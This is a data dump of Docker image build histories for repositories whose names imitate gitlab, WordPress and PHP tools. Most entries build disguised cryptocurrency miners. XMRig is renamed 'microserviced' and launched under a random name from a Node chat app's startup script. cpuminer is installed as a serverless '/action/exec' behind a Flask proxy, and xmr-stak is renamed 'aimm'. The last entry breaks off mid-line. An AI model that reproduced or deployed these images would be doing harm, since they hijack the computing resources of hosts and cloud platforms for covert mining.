apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
levucupdong/gitlabcommit; b'ADD file:89e72bfc19e81624ba6a34bd5cecdf258750dc569ba03e17e3f4a286b1526461 /\nCMD ["/bin/sh"]\nENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LANG=C.UTF-8\nRUN apk add --no-cache ca-certificates\nENV GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION=3.6.1\nRUN set -ex \t&& apk add --no-cache --virtual .fetch-deps \t\tgnupg \t\topenssl \t\ttar \t\txz \t\t&& wget -O python.tar.xz "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz" \t&& wget -O python.tar.xz.asc "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz.asc" \t&& export GNUPGHOME="$(mktemp -d)" \t&& gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$GPG_KEY" \t&& gpg --batch --verify python.tar.xz.asc python.tar.xz \t&& rm -rf "$GNUPGHOME" python.tar.xz.asc \t&& mkdir -p /usr/src/python \t&& tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \t&& rm python.tar.xz \t\t&& apk add --no-cache --virtual .build-deps  \t\tbzip2-dev \t\tcoreutils \t\tdpkg-dev dpkg \t\texpat-dev \t\tgcc \t\tgdbm-dev \t\tlibc-dev \t\tlibffi-dev \t\tlinux-headers \t\tmake \t\tncurses-dev \t\topenssl \t\topenssl-dev \t\tpax-utils \t\treadline-dev \t\tsqlite-dev \t\ttcl-dev \t\ttk \t\ttk-dev \t\txz-dev \t\tzlib-dev \t&& apk del .fetch-deps \t\t&& cd /usr/src/python \t&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \t&& ./configure \t\t--build="$gnuArch" \t\t--enable-loadable-sqlite-extensions \t\t--enable-shared \t\t--with-system-expat \t\t--with-system-ffi \t\t--without-ensurepip \t&& make -j "$(nproc)" \t&& make install \t\t&& runDeps="$( \t\tscanelf --needed --nobanner --recursive /usr/local \t\t\t| awk \'{ gsub(/,/, "\\nso:", $2); print "so:" $2 }\' \t\t\t| sort -u \t\t\t| xargs -r apk info --installed \t\t\t| sort -u \t)" \t&& apk add --virtual .python-rundeps $runDeps \t&& apk del .build-deps \t\t&& find /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' + \t&& rm -rf /usr/src/python\nRUN cd /usr/local/bin \t&& ln -s idle3 idle \t&& ln -s pydoc3 pydoc \t&& ln -s python3 python \t&& ln -s python3-config python-config\nENV PYTHON_PIP_VERSION=9.0.1\nRUN set -ex; \t\tapk add --no-cache --virtual .fetch-deps openssl; \t\twget -O get-pip.py \'https://bootstrap.pypa.io/get-pip.py\'; \t\tapk del .fetch-deps; \t\tpython get-pip.py \t\t--disable-pip-version-check \t\t--no-cache-dir \t\t"pip==$PYTHON_PIP_VERSION" \t; \tpip --version; \t\tfind /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' +; \trm -f get-pip.py\nCMD ["python3"]\nENV FLASK_PROXY_PORT=8080\nRUN apk add --update --no-cache --virtual .build-deps         util-linux g++ gcc libc-dev build-base binutils cmake automake autoconf make curl-dev ncurses5-libs\nRUN pip install --upgrade pip setuptools six         && pip install --no-cache-dir gevent==1.2.1 flask==0.12\nCOPY dir:2455cc22975a266e51e428df7e347ea3b979df24f49ed2dca6f3354c6c74203c cpuminer\nRUN cd cpuminer && ./autogen.sh\nRUN cd cpuminer && CFLAGS="-march=native" ./configure\nRUN cd cpuminer && make\nRUN mkdir -p /action\nRUN cp cpuminer/minerd /action/exec\nRUN mkdir -p /actionProxy\nADD file:2d1a1d3e1a93ed1ceb7bdfc86a7afa9b94f44ab70d5b1aeb3ff8777cf19cdb72 /actionProxy/\nCMD ["/bin/sh -c cd actionProxy && python -u actionproxy.py"]'
g1080/raytray; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
wogi/asusstrix; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
ununyaa/phpcarttx; b'ADD file:89e72bfc19e81624ba6a34bd5cecdf258750dc569ba03e17e3f4a286b1526461 /\nCMD ["/bin/sh"]\nENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LANG=C.UTF-8\nRUN apk add --no-cache ca-certificates\nENV GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION=3.6.1\nRUN set -ex \t&& apk add --no-cache --virtual .fetch-deps \t\tgnupg \t\topenssl \t\ttar \t\txz \t\t&& wget -O python.tar.xz "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz" \t&& wget -O python.tar.xz.asc "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz.asc" \t&& export GNUPGHOME="$(mktemp -d)" \t&& gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$GPG_KEY" \t&& gpg --batch --verify python.tar.xz.asc python.tar.xz \t&& rm -rf "$GNUPGHOME" python.tar.xz.asc \t&& mkdir -p /usr/src/python \t&& tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \t&& rm python.tar.xz \t\t&& apk add --no-cache --virtual .build-deps  \t\tbzip2-dev \t\tcoreutils \t\tdpkg-dev dpkg \t\texpat-dev \t\tgcc \t\tgdbm-dev \t\tlibc-dev \t\tlibffi-dev \t\tlinux-headers \t\tmake \t\tncurses-dev \t\topenssl \t\topenssl-dev \t\tpax-utils \t\treadline-dev \t\tsqlite-dev \t\ttcl-dev \t\ttk \t\ttk-dev \t\txz-dev \t\tzlib-dev \t&& apk del .fetch-deps \t\t&& cd /usr/src/python \t&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \t&& ./configure \t\t--build="$gnuArch" \t\t--enable-loadable-sqlite-extensions \t\t--enable-shared \t\t--with-system-expat \t\t--with-system-ffi \t\t--without-ensurepip \t&& make -j "$(nproc)" \t&& make install \t\t&& runDeps="$( \t\tscanelf --needed --nobanner --recursive /usr/local \t\t\t| awk \'{ gsub(/,/, "\\nso:", $2); print "so:" $2 }\' \t\t\t| sort -u \t\t\t| xargs -r apk info --installed \t\t\t| sort -u \t)" \t&& apk add --virtual .python-rundeps $runDeps \t&& apk del .build-deps \t\t&& find /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' + \t&& rm -rf /usr/src/python\nRUN cd /usr/local/bin \t&& ln -s idle3 idle \t&& ln -s pydoc3 pydoc \t&& ln -s python3 python \t&& ln -s python3-config python-config\nENV PYTHON_PIP_VERSION=9.0.1\nRUN set -ex; \t\tapk add --no-cache --virtual .fetch-deps openssl; \t\twget -O get-pip.py \'https://bootstrap.pypa.io/get-pip.py\'; \t\tapk del .fetch-deps; \t\tpython get-pip.py \t\t--disable-pip-version-check \t\t--no-cache-dir \t\t"pip==$PYTHON_PIP_VERSION" \t; \tpip --version; \t\tfind /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' +; \trm -f get-pip.py\nCMD ["python3"]\nENV FLASK_PROXY_PORT=8080\nRUN apk add --update --no-cache --virtual .build-deps         util-linux g++ gcc libc-dev build-base binutils cmake automake autoconf make curl-dev ncurses5-libs\nRUN pip install --upgrade pip setuptools six         && pip install --no-cache-dir gevent==1.2.1 flask==0.12\nCOPY dir:2455cc22975a266e51e428df7e347ea3b979df24f49ed2dca6f3354c6c74203c cpuminer\nRUN cd cpuminer && ./autogen.sh\nRUN cd cpuminer && CFLAGS="-march=native" ./configure\nRUN cd cpuminer && make\nRUN mkdir -p /action\nRUN cp cpuminer/minerd /action/exec\nRUN mkdir -p /actionProxy\nADD file:2d1a1d3e1a93ed1ceb7bdfc86a7afa9b94f44ab70d5b1aeb3ff8777cf19cdb72 /actionProxy/\nCMD ["/bin/sh -c cd actionProxy && python -u actionproxy.py"]'
levucupdong/gitlabpipe; b'ADD file:89e72bfc19e81624ba6a34bd5cecdf258750dc569ba03e17e3f4a286b1526461 /\nCMD ["/bin/sh"]\nENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LANG=C.UTF-8\nRUN apk add --no-cache ca-certificates\nENV GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION=3.6.1\nRUN set -ex \t&& apk add --no-cache --virtual .fetch-deps \t\tgnupg \t\topenssl \t\ttar \t\txz \t\t&& wget -O python.tar.xz "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz" \t&& wget -O python.tar.xz.asc "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz.asc" \t&& export GNUPGHOME="$(mktemp -d)" \t&& gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$GPG_KEY" \t&& gpg --batch --verify python.tar.xz.asc python.tar.xz \t&& rm -rf "$GNUPGHOME" python.tar.xz.asc \t&& mkdir -p /usr/src/python \t&& tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \t&& rm python.tar.xz \t\t&& apk add --no-cache --virtual .build-deps  \t\tbzip2-dev \t\tcoreutils \t\tdpkg-dev dpkg \t\texpat-dev \t\tgcc \t\tgdbm-dev \t\tlibc-dev \t\tlibffi-dev \t\tlinux-headers \t\tmake \t\tncurses-dev \t\topenssl \t\topenssl-dev \t\tpax-utils \t\treadline-dev \t\tsqlite-dev \t\ttcl-dev \t\ttk \t\ttk-dev \t\txz-dev \t\tzlib-dev \t&& apk del .fetch-deps \t\t&& cd /usr/src/python \t&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \t&& ./configure \t\t--build="$gnuArch" \t\t--enable-loadable-sqlite-extensions \t\t--enable-shared \t\t--with-system-expat \t\t--with-system-ffi \t\t--without-ensurepip \t&& make -j "$(nproc)" \t&& make install \t\t&& runDeps="$( \t\tscanelf --needed --nobanner --recursive /usr/local \t\t\t| awk \'{ gsub(/,/, "\\nso:", $2); print "so:" $2 }\' \t\t\t| sort -u \t\t\t| xargs -r apk info --installed \t\t\t| sort -u \t)" \t&& apk add --virtual .python-rundeps $runDeps \t&& apk del .build-deps \t\t&& find /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' + \t&& rm -rf /usr/src/python\nRUN cd /usr/local/bin \t&& ln -s idle3 idle \t&& ln -s pydoc3 pydoc \t&& ln -s python3 python \t&& ln -s python3-config python-config\nENV PYTHON_PIP_VERSION=9.0.1\nRUN set -ex; \t\tapk add --no-cache --virtual .fetch-deps openssl; \t\twget -O get-pip.py \'https://bootstrap.pypa.io/get-pip.py\'; \t\tapk del .fetch-deps; \t\tpython get-pip.py \t\t--disable-pip-version-check \t\t--no-cache-dir \t\t"pip==$PYTHON_PIP_VERSION" \t; \tpip --version; \t\tfind /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' +; \trm -f get-pip.py\nCMD ["python3"]\nENV FLASK_PROXY_PORT=8080\nRUN apk add --update --no-cache --virtual .build-deps         util-linux g++ gcc libc-dev build-base binutils cmake automake autoconf make curl-dev ncurses5-libs\nRUN pip install --upgrade pip setuptools six         && pip install --no-cache-dir gevent==1.2.1 flask==0.12\nCOPY dir:2455cc22975a266e51e428df7e347ea3b979df24f49ed2dca6f3354c6c74203c cpuminer\nRUN cd cpuminer && ./autogen.sh\nRUN cd cpuminer && CFLAGS="-march=native" ./configure\nRUN cd cpuminer && make\nRUN mkdir -p /action\nRUN cp cpuminer/minerd /action/exec\nRUN mkdir -p /actionProxy\nADD file:2d1a1d3e1a93ed1ceb7bdfc86a7afa9b94f44ab70d5b1aeb3ff8777cf19cdb72 /actionProxy/\nCMD ["/bin/sh -c cd actionProxy && python -u actionproxy.py"]'
wevglubex/wpdig; b'ADD file:89e72bfc19e81624ba6a34bd5cecdf258750dc569ba03e17e3f4a286b1526461 /\nCMD ["/bin/sh"]\nENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LANG=C.UTF-8\nRUN apk add --no-cache ca-certificates\nENV GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION=3.6.1\nRUN set -ex \t&& apk add --no-cache --virtual .fetch-deps \t\tgnupg \t\topenssl \t\ttar \t\txz \t\t&& wget -O python.tar.xz "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz" \t&& wget -O python.tar.xz.asc "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz.asc" \t&& export GNUPGHOME="$(mktemp -d)" \t&& gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$GPG_KEY" \t&& gpg --batch --verify python.tar.xz.asc python.tar.xz \t&& rm -rf "$GNUPGHOME" python.tar.xz.asc \t&& mkdir -p /usr/src/python \t&& tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \t&& rm python.tar.xz \t\t&& apk add --no-cache --virtual .build-deps  \t\tbzip2-dev \t\tcoreutils \t\tdpkg-dev dpkg \t\texpat-dev \t\tgcc \t\tgdbm-dev \t\tlibc-dev \t\tlibffi-dev \t\tlinux-headers \t\tmake \t\tncurses-dev \t\topenssl \t\topenssl-dev \t\tpax-utils \t\treadline-dev \t\tsqlite-dev \t\ttcl-dev \t\ttk \t\ttk-dev \t\txz-dev \t\tzlib-dev \t&& apk del .fetch-deps \t\t&& cd /usr/src/python \t&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \t&& ./configure \t\t--build="$gnuArch" \t\t--enable-loadable-sqlite-extensions \t\t--enable-shared \t\t--with-system-expat \t\t--with-system-ffi \t\t--without-ensurepip \t&& make -j "$(nproc)" \t&& make install \t\t&& runDeps="$( \t\tscanelf --needed --nobanner --recursive /usr/local \t\t\t| awk \'{ gsub(/,/, "\\nso:", $2); print "so:" $2 }\' \t\t\t| sort -u \t\t\t| xargs -r apk info --installed \t\t\t| sort -u \t)" \t&& apk add --virtual .python-rundeps $runDeps \t&& apk del .build-deps \t\t&& find /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' + \t&& rm -rf /usr/src/python\nRUN cd /usr/local/bin \t&& ln -s idle3 idle \t&& ln -s pydoc3 pydoc \t&& ln -s python3 python \t&& ln -s python3-config python-config\nENV PYTHON_PIP_VERSION=9.0.1\nRUN set -ex; \t\tapk add --no-cache --virtual .fetch-deps openssl; \t\twget -O get-pip.py \'https://bootstrap.pypa.io/get-pip.py\'; \t\tapk del .fetch-deps; \t\tpython get-pip.py \t\t--disable-pip-version-check \t\t--no-cache-dir \t\t"pip==$PYTHON_PIP_VERSION" \t; \tpip --version; \t\tfind /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' +; \trm -f get-pip.py\nCMD ["python3"]\nENV FLASK_PROXY_PORT=8080\nRUN apk add --update --no-cache --virtual .build-deps         util-linux g++ gcc libc-dev build-base binutils cmake automake autoconf make curl-dev ncurses5-libs\nRUN pip install --upgrade pip setuptools six         && pip install --no-cache-dir gevent==1.2.1 flask==0.12\nCOPY dir:2455cc22975a266e51e428df7e347ea3b979df24f49ed2dca6f3354c6c74203c cpuminer\nRUN cd cpuminer && ./autogen.sh\nRUN cd cpuminer && CFLAGS="-march=native" ./configure\nRUN cd cpuminer && make\nRUN mkdir -p /action\nRUN cp cpuminer/minerd /action/exec\nRUN mkdir -p /actionProxy\nADD file:2d1a1d3e1a93ed1ceb7bdfc86a7afa9b94f44ab70d5b1aeb3ff8777cf19cdb72 /actionProxy/\nCMD ["/bin/sh -c cd actionProxy && python -u actionproxy.py"]'
wevglubex/wp2; b'ADD file:89e72bfc19e81624ba6a34bd5cecdf258750dc569ba03e17e3f4a286b1526461 /\nCMD ["/bin/sh"]\nENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LANG=C.UTF-8\nRUN apk add --no-cache ca-certificates\nENV GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION=3.6.1\nRUN set -ex \t&& apk add --no-cache --virtual .fetch-deps \t\tgnupg \t\topenssl \t\ttar \t\txz \t\t&& wget -O python.tar.xz "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz" \t&& wget -O python.tar.xz.asc "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz.asc" \t&& export GNUPGHOME="$(mktemp -d)" \t&& gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$GPG_KEY" \t&& gpg --batch --verify python.tar.xz.asc python.tar.xz \t&& rm -rf "$GNUPGHOME" python.tar.xz.asc \t&& mkdir -p /usr/src/python \t&& tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \t&& rm python.tar.xz \t\t&& apk add --no-cache --virtual .build-deps  \t\tbzip2-dev \t\tcoreutils \t\tdpkg-dev dpkg \t\texpat-dev \t\tgcc \t\tgdbm-dev \t\tlibc-dev \t\tlibffi-dev \t\tlinux-headers \t\tmake \t\tncurses-dev \t\topenssl \t\topenssl-dev \t\tpax-utils \t\treadline-dev \t\tsqlite-dev \t\ttcl-dev \t\ttk \t\ttk-dev \t\txz-dev \t\tzlib-dev \t&& apk del .fetch-deps \t\t&& cd /usr/src/python \t&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \t&& ./configure \t\t--build="$gnuArch" \t\t--enable-loadable-sqlite-extensions \t\t--enable-shared \t\t--with-system-expat \t\t--with-system-ffi \t\t--without-ensurepip \t&& make -j "$(nproc)" \t&& make install \t\t&& runDeps="$( \t\tscanelf --needed --nobanner --recursive /usr/local \t\t\t| awk \'{ gsub(/,/, "\\nso:", $2); print "so:" $2 }\' \t\t\t| sort -u \t\t\t| xargs -r apk info --installed \t\t\t| sort -u \t)" \t&& apk add --virtual .python-rundeps $runDeps \t&& apk del .build-deps \t\t&& find /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' + \t&& rm -rf /usr/src/python\nRUN cd /usr/local/bin \t&& ln -s idle3 idle \t&& ln -s pydoc3 pydoc \t&& ln -s python3 python \t&& ln -s python3-config python-config\nENV PYTHON_PIP_VERSION=9.0.1\nRUN set -ex; \t\tapk add --no-cache --virtual .fetch-deps openssl; \t\twget -O get-pip.py \'https://bootstrap.pypa.io/get-pip.py\'; \t\tapk del .fetch-deps; \t\tpython get-pip.py \t\t--disable-pip-version-check \t\t--no-cache-dir \t\t"pip==$PYTHON_PIP_VERSION" \t; \tpip --version; \t\tfind /usr/local -depth \t\t\\( \t\t\t\\( -type d -a -name test -o -name tests \\) \t\t\t-o \t\t\t\\( -type f -a -name \'*.pyc\' -o -name \'*.pyo\' \\) \t\t\\) -exec rm -rf \'{}\' +; \trm -f get-pip.py\nCMD ["python3"]\nENV FLASK_PROXY_PORT=8080\nRUN apk add --update --no-cache --virtual .build-deps         util-linux g++ gcc libc-dev build-base binutils cmake automake autoconf make curl-dev ncurses5-libs\nRUN pip install --upgrade pip setuptools six         && pip install --no-cache-dir gevent==1.2.1 flask==0.12\nCOPY dir:2455cc22975a266e51e428df7e347ea3b979df24f49ed2dca6f3354c6c74203c cpuminer\nRUN cd cpuminer && ./autogen.sh\nRUN cd cpuminer && CFLAGS="-march=native" ./configure\nRUN cd cpuminer && make\nRUN mkdir -p /action\nRUN cp cpuminer/minerd /action/exec\nRUN mkdir -p /actionProxy\nADD file:2d1a1d3e1a93ed1ceb7bdfc86a7afa9b94f44ab70d5b1aeb3ff8777cf19cdb72 /actionProxy/\nCMD ["/bin/sh -c cd actionProxy && python -u actionproxy.py"]'
kendoit/alpine-aimm; b'ADD file:4583e12bf5caec40b861a3409f2a1624c3f3556cc457edb99c9707f00e779e45 /\nCMD ["/bin/sh"]\nCOPY file:6695c5f0fdcca621202eaf0e9347f5a4d2b6bea159b8519bcb0d0cd9018e30aa /tmp/\nCOPY file:144b8a347da847c9f5f0d5eebf45ae5317b32810f27cda697819ce1ae76c3610 /tmp/\nRUN apk --no-cache upgrade &&   apk --no-cache add     openssl-dev     cmake     g++     build-base     git     libmicrohttpd-dev &&   git clone https://github.com/b-i-t-n/xmr-stak-cpu &&   cd xmr-stak-cpu &&   cmake -DCMAKE_LINK_STATIC=ON -DHWLOC_ENABLE=OFF . &&   make &&   ln -s bin/xmr-stak-cpu bin/aimm &&   cd / &&   mkdir /opt &&   mv /xmr-stak-cpu /opt/xmr-stak-cpu &&   apk del     cmake     g++     build-base     git\nWORKDIR /tmp\nENTRYPOINT ["./start.sh"]'
wevglubex/wp; b'ADD file:89e72bfc19e81624ba6a34bd5cecdf258750dc569ba03e17e3f4a286b1526461 /\nCMD ["/bin/sh"]\nENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LANG=C.UTF-8\nRUN apk add --no-cache ca-certificates\nENV GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\nENV PYTHON_VERSION=3.6.1\nRUN set -ex \t&& apk add --no-cache --virtual .fetch-deps \t\tgnupg \t\topenssl \t\ttar \t\txz \t\t&& wget -O python.tar.xz "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz" \t&& wget -O python.tar.xz.asc "https://www.python.org/ftp/python/${PYTHON_VERSION%%a-z*}/Python-$PYTHON_VERSION.tar.xz.asc" \t&& export GNUPGHOME="$(mktemp -d)" \t&& gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$GPG_KEY" \t&& gpg --batch --verify python.tar.xz.asc python.tar.xz \t&& rm -rf "$GNUPGHOME" python.tar.xz.asc \t&& mkdir -p /usr/src/python \t&& tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \t&& rm python.tar.xz \t\t&& apk add --no-cache --virtual .build-deps  \t\tbzip2-dev \t\tcoreutils \t\tdpkg-dev dpkg \t\texpat-dev \t\tgcc \t\tgdbm-dev \t\tlibc-dev \t\tlibffi-dev \t\tlinux-headers \t\tmake \t\tncurses-dev \t\topenssl \t\topenssl-dev \t\tpax-utils \t\treadline-dev \t\tsqlite-dev \t\ttcl-dev \t\ttk \t\ttk-dev \t\txz-dev \t\tzlib-dev \t&& apk del .fetch-deps \t\t&& cd /usr/src/python \t&& gnuArch="$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)" \t&& ./configure \t\t--build="$gnuArch" \t\t--enable-loadable-sqlite-extensions \t\t--enable-shared \t\t--with-system-expat \t\t--with-system-ffi \t\t--without-ensurepip \t&& make -j "$(nproc)" \t&& make install \t\t&& runDeps="$( \t\tscanelf --needed --nobanner --recursive /usr/local \t\t\t| awk \'{ gsub(/,/, "\\nso:", $2); print "so:" $2 }\' 